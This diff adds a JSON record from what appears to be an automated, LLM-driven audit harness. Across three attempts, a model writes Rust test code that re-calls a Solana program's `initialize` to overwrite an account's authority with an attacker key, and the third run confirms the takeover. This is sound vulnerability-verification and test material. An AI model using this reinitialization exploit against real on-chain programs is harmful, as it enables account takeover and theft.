@@ -1,0 +1,160 @@
+{
+  "category": "REINIT",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: autoridade da conta user foi sobrescrita pela chave do atacante; autoridade original foi substituida",
+  "attempts_used": 3,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2544,
+        "completion_tokens": 664,
+        "latency_s": 3.75
+      },
+      "raw": "{\n  \"plan\": \"O programa native `initialize` recebe duas contas: `user` (gravavel, 32 bytes de dados) e `authority` (signer). O baseline chama `initialize` legitimamente com a autoridade original, gravando-a na conta `user`. O ataque reutiliza a mesma instrucao sobre a conta `user` ja inicializada, mas passando a chave do atacante como `authority`, sobrescrevendo a autoridade original. O efeito medido e que os 32 bytes da conta `user` apos o ataque contem a chave do atacante, diferente da autoridade original gravada pelo baseline.\",\n  \"scenario\": \"let user_key = Pubkey::new_unique();\\nlet authority_original = Pubkey::new_unique();\\nlet authority_atacante = Pubkey::new_unique();\\n\\nlet user_account = account(&env.program_id, &vec![0u8; 32], None);\\nlet authority_original_account = wallet(1_000_000_000);\\nlet authority_atacante_account = wallet(1_000_000_000);\\n\\nlet ix_baseline = env.raw_ix(&vec![0u8], &[\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority_original, true),\\n]);\\n\\nlet contas_baseline = vec![\\n    (user_key, user_account.clone()),\\n    (authority_original, authority_original_account.clone()),\\n];\\n\\nlet r_baseline = env.baseline(\\\"initialize legitimo com autoridade original\\\", &ix_baseline, &contas_baseline);\\n\\nlet user_pos_baseline = after(&r_baseline, &user_key).clone();\\n\\nlet ix_ataque = env.raw_ix(&vec![0u8], &[\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority_atacante, true),\\n]);\\n\\nlet contas_ataque = vec![\\n    (user_key, user_pos_baseline),\\n    (authority_atacante, authority_atacante_account),\\n];\\n\\nlet r_ataque = env.attack(\\\"reinitialize sobrescrevendo autoridade\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let dados_finais = after(&r_ataque, &user_key).data();\\n    let autoridade_final = read_pubkey(dados_finais, 0);\\n    env.effect(\\\"autoridade da conta user foi sobrescrita pela chave do atacante\\\", autoridade_final == authority_atacante);\\n    env.effect(\\\"autoridade original foi substituida\\\", autoridade_final != authority_original);\\n}\"\n}",
+      "plan": "O programa native `initialize` recebe duas contas: `user` (gravavel, 32 bytes de dados) e `authority` (signer). O baseline chama `initialize` legitimamente com a autoridade original, gravando-a na conta `user`. O ataque reutiliza a mesma instrucao sobre a conta `user` ja inicializada, mas passando a chave do atacante como `authority`, sobrescrevendo a autoridade original. O efeito medido e que os 32 bytes da conta `user` apos o ataque contem a chave do atacante, diferente da autoridade original gravada pelo baseline.",
+      "scenario": "let user_key = Pubkey::new_unique();\nlet authority_original = Pubkey::new_unique();\nlet authority_atacante = Pubkey::new_unique();\n\nlet user_account = account(&env.program_id, &vec![0u8; 32], None);\nlet authority_original_account = wallet(1_000_000_000);\nlet authority_atacante_account = wallet(1_000_000_000);\n\nlet ix_baseline = env.raw_ix(&vec![0u8], &[\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority_original, true),\n]);\n\nlet contas_baseline = vec![\n    (user_key, user_account.clone()),\n    (authority_original, authority_original_account.clone()),\n];\n\nlet r_baseline = env.baseline(\"initialize legitimo com autoridade original\", &ix_baseline, &contas_baseline);\n\nlet user_pos_baseline = after(&r_baseline, &user_key).clone();\n\nlet ix_ataque = env.raw_ix(&vec![0u8], &[\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority_atacante, true),\n]);\n\nlet contas_ataque = vec![\n    (user_key, user_pos_baseline),\n    (authority_atacante, authority_atacante_account),\n];\n\nlet r_ataque = env.attack(\"reinitialize sobrescrevendo autoridade\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let dados_finais = after(&r_ataque, &user_key).data();\n    let autoridade_final = read_pubkey(dados_finais, 0);\n    env.effect(\"autoridade da conta user foi sobrescrita pela chave do atacante\", autoridade_final == authority_atacante);\n    env.effect(\"autoridade original foi substituida\", autoridade_final != authority_original);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:17:46\n    |\n 17 |       let ix_baseline = env.raw_ix(&vec![0u8], &[\n    |  ___________________________------_____________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 18 | |         AccountMeta::new(user_key, false),\n 19 | |         AccountMeta::new_readonly(authority_original, true),\n 20 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:31:44\n    |\n 31 |       let ix_ataque = env.raw_ix(&vec![0u8], &[\n    |  _________________________------_____________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 32 | |         AccountMeta::new(user_key, false),\n 33 | |         AccountMeta::new_readonly(authority_atacante, true),\n 34 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:17:46\n    |\n 17 |       let ix_baseline = env.raw_ix(&vec![0u8], &[\n    |  ___________________________------_____________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 18 | |         AccountMeta::new(user_key, false),\n 19 | |         AccountMeta::new_readonly(authority_original, true),\n 20 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:31:44\n    |\n 31 |       let ix_ataque = env.raw_ix(&vec![0u8], &[\n    |  _________________________------_____________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 32 | |         AccountMeta::new(user_key, false),\n 33 | |         AccountMeta::new_readonly(authority_atacante, true),\n 34 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3348,
+        "completion_tokens": 662,
+        "latency_s": 3.43
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta user com 32 bytes zerados (dono: program_id) e uma carteira para a autoridade original. O baseline chama initialize legitimamente, gravando a autoridade original na conta user. O ataque chama initialize novamente sobre a mesma conta ja inicializada, passando a chave do atacante como authority, sobrescrevendo a autoridade. O efeito verifica que a autoridade final na conta user e a chave do atacante e diferente da original.\",\n  \"scenario\": \"let user_key = Pubkey::new_unique();\\nlet authority_original = Pubkey::new_unique();\\nlet authority_atacante = Pubkey::new_unique();\\n\\nlet user_account = account(&env.program_id, &vec![0u8; 32], None);\\nlet authority_original_account = wallet(1_000_000_000);\\nlet authority_atacante_account = wallet(1_000_000_000);\\n\\nlet metas_baseline = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority_original, true),\\n];\\nlet ix_baseline = env.raw_ix(&vec![0u8], &metas_baseline);\\n\\nlet contas_baseline = vec![\\n    (user_key, user_account.clone()),\\n    (authority_original, authority_original_account.clone()),\\n];\\n\\nlet r_baseline = env.baseline(\\\"initialize legitimo com autoridade original\\\", &ix_baseline, &contas_baseline);\\n\\nlet user_pos_baseline = after(&r_baseline, &user_key).clone();\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority_atacante, true),\\n];\\nlet ix_ataque = env.raw_ix(&vec![0u8], &metas_ataque);\\n\\nlet contas_ataque = vec![\\n    (user_key, user_pos_baseline),\\n    (authority_atacante, authority_atacante_account),\\n];\\n\\nlet r_ataque = env.attack(\\\"reinitialize sobrescrevendo autoridade\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let dados_finais = after(&r_ataque, &user_key).data();\\n    let autoridade_final = read_pubkey(dados_finais, 0);\\n    env.effect(\\\"autoridade da conta user foi sobrescrita pela chave do atacante\\\", autoridade_final == authority_atacante);\\n    env.effect(\\\"autoridade original foi substituida\\\", autoridade_final != authority_original);\\n}\"\n}",
+      "plan": "Preparo uma conta user com 32 bytes zerados (dono: program_id) e uma carteira para a autoridade original. O baseline chama initialize legitimamente, gravando a autoridade original na conta user. O ataque chama initialize novamente sobre a mesma conta ja inicializada, passando a chave do atacante como authority, sobrescrevendo a autoridade. O efeito verifica que a autoridade final na conta user e a chave do atacante e diferente da original.",
+      "scenario": "let user_key = Pubkey::new_unique();\nlet authority_original = Pubkey::new_unique();\nlet authority_atacante = Pubkey::new_unique();\n\nlet user_account = account(&env.program_id, &vec![0u8; 32], None);\nlet authority_original_account = wallet(1_000_000_000);\nlet authority_atacante_account = wallet(1_000_000_000);\n\nlet metas_baseline = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority_original, true),\n];\nlet ix_baseline = env.raw_ix(&vec![0u8], &metas_baseline);\n\nlet contas_baseline = vec![\n    (user_key, user_account.clone()),\n    (authority_original, authority_original_account.clone()),\n];\n\nlet r_baseline = env.baseline(\"initialize legitimo com autoridade original\", &ix_baseline, &contas_baseline);\n\nlet user_pos_baseline = after(&r_baseline, &user_key).clone();\n\nlet metas_ataque = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority_atacante, true),\n];\nlet ix_ataque = env.raw_ix(&vec![0u8], &metas_ataque);\n\nlet contas_ataque = vec![\n    (user_key, user_pos_baseline),\n    (authority_atacante, authority_atacante_account),\n];\n\nlet r_ataque = env.attack(\"reinitialize sobrescrevendo autoridade\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let dados_finais = after(&r_ataque, &user_key).data();\n    let autoridade_final = read_pubkey(dados_finais, 0);\n    env.effect(\"autoridade da conta user foi sobrescrita pela chave do atacante\", autoridade_final == authority_atacante);\n    env.effect(\"autoridade original foi substituida\", autoridade_final != authority_original);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:21:46\n    |\n 21 |     let ix_baseline = env.raw_ix(&vec![0u8], &metas_baseline);\n    |                           ------             ^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                           |\n    |                           arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:36:44\n    |\n 36 |     let ix_ataque = env.raw_ix(&vec![0u8], &metas_ataque);\n    |                         ------             ^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                         |\n    |                         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:21:46\n    |\n 21 |     let ix_baseline = env.raw_ix(&vec![0u8], &metas_baseline);\n    |                           ------             ^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                           |\n    |                           arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:36:44\n    |\n 36 |     let ix_ataque = env.raw_ix(&vec![0u8], &metas_ataque);\n    |                         ------             ^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                         |\n    |                         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3357,
+        "completion_tokens": 670,
+        "latency_s": 3.52
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta user com 32 bytes zerados (dono: program_id) e duas carteiras: autoridade original e autoridade atacante. O baseline chama initialize legitimamente com a autoridade original, gravando-a na conta. O ataque reexecuta initialize sobre a mesma conta ja inicializada (estado vindo de resulting_accounts do baseline), passando a chave do atacante como authority. O efeito mede que os 32 bytes da conta user passaram a ser a pubkey do atacante, diferente da autoridade original.\",\n  \"scenario\": \"let user_key = Pubkey::new_unique();\\nlet authority_original = Pubkey::new_unique();\\nlet authority_atacante = Pubkey::new_unique();\\n\\nlet user_account = account(&env.program_id, &vec![0u8; 32], None);\\nlet authority_original_account = wallet(1_000_000_000);\\nlet authority_atacante_account = wallet(1_000_000_000);\\n\\nlet metas_baseline = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority_original, true),\\n];\\nlet ix_baseline = env.raw_ix(&vec![0u8], metas_baseline);\\n\\nlet contas_baseline = vec![\\n    (user_key, user_account.clone()),\\n    (authority_original, authority_original_account.clone()),\\n];\\n\\nlet r_baseline = env.baseline(\\\"initialize legitimo com autoridade original\\\", &ix_baseline, &contas_baseline);\\n\\nlet user_pos_baseline = after(&r_baseline, &user_key).clone();\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority_atacante, true),\\n];\\nlet ix_ataque = env.raw_ix(&vec![0u8], metas_ataque);\\n\\nlet contas_ataque = vec![\\n    (user_key, user_pos_baseline),\\n    (authority_atacante, authority_atacante_account),\\n];\\n\\nlet r_ataque = env.attack(\\\"reinitialize sobrescrevendo autoridade\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let dados_finais = after(&r_ataque, &user_key).data();\\n    let autoridade_final = read_pubkey(dados_finais, 0);\\n    env.effect(\\\"autoridade da conta user foi sobrescrita pela chave do atacante\\\", autoridade_final == authority_atacante);\\n    env.effect(\\\"autoridade original foi substituida\\\", autoridade_final != authority_original);\\n}\"\n}",
+      "plan": "Preparo uma conta user com 32 bytes zerados (dono: program_id) e duas carteiras: autoridade original e autoridade atacante. O baseline chama initialize legitimamente com a autoridade original, gravando-a na conta. O ataque reexecuta initialize sobre a mesma conta ja inicializada (estado vindo de resulting_accounts do baseline), passando a chave do atacante como authority. O efeito mede que os 32 bytes da conta user passaram a ser a pubkey do atacante, diferente da autoridade original.",
+      "scenario": "let user_key = Pubkey::new_unique();\nlet authority_original = Pubkey::new_unique();\nlet authority_atacante = Pubkey::new_unique();\n\nlet user_account = account(&env.program_id, &vec![0u8; 32], None);\nlet authority_original_account = wallet(1_000_000_000);\nlet authority_atacante_account = wallet(1_000_000_000);\n\nlet metas_baseline = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority_original, true),\n];\nlet ix_baseline = env.raw_ix(&vec![0u8], metas_baseline);\n\nlet contas_baseline = vec![\n    (user_key, user_account.clone()),\n    (authority_original, authority_original_account.clone()),\n];\n\nlet r_baseline = env.baseline(\"initialize legitimo com autoridade original\", &ix_baseline, &contas_baseline);\n\nlet user_pos_baseline = after(&r_baseline, &user_key).clone();\n\nlet metas_ataque = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority_atacante, true),\n];\nlet ix_ataque = env.raw_ix(&vec![0u8], metas_ataque);\n\nlet contas_ataque = vec![\n    (user_key, user_pos_baseline),\n    (authority_atacante, authority_atacante_account),\n];\n\nlet r_ataque = env.attack(\"reinitialize sobrescrevendo autoridade\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let dados_finais = after(&r_ataque, &user_key).data();\n    let autoridade_final = read_pubkey(dados_finais, 0);\n    env.effect(\"autoridade da conta user foi sobrescrita pela chave do atacante\", autoridade_final == authority_atacante);\n    env.effect(\"autoridade original foi substituida\", autoridade_final != authority_original);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo com autoridade original",
+            "result": "Success",
+            "compute_units": 9630,
+            "account_flags": "-w,sr",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000000",
+                "digest": "66687aadf862bd77",
+                "post": "0000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "reinitialize sobrescrevendo autoridade",
+            "result": "Success",
+            "compute_units": 14799,
+            "account_flags": "-w,sr",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000003",
+                "digest": "71626eb965307659",
+                "post": "0000000000000004000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "autoridade da conta user foi sobrescrita pela chave do atacante",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "autoridade original foi substituida",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 9630 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 14799 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: autoridade da conta user foi sobrescrita pela chave do atacante; autoridade original foi substituida"
+    }
+  ],
+  "case_id": "HK-REINIT-V",
+  "static_finding": {
+    "category": "REINIT",
+    "confidence": "high",
+    "evidence": "let mut user = User::unpack_unchecked(&user_data)?;\nuser.authority = *authority_info.key;\nuser.pack_into_slice(&mut user_data);",
+    "explanation": "A instrucao `initialize` grava a autoridade na conta sem verificar se ela ja foi inicializada. Nao ha checagem de flag `is_initialized` nem uso de `init` do Anchor. A implementacao de `IsInitialized` retorna sempre `true`, o que nao protege contra reinicializacao. Assim, a instrucao pode ser executada repetidamente sobre uma conta ja inicializada, sobrescrevendo a autoridade.",
+    "attack_hypothesis": "Um atacante chama `initialize` novamente sobre uma conta `user` ja inicializada, passando sua propria chave como `authority_info`, sobrescrevendo a autoridade original e assumindo o controle da conta."
+  }
+}
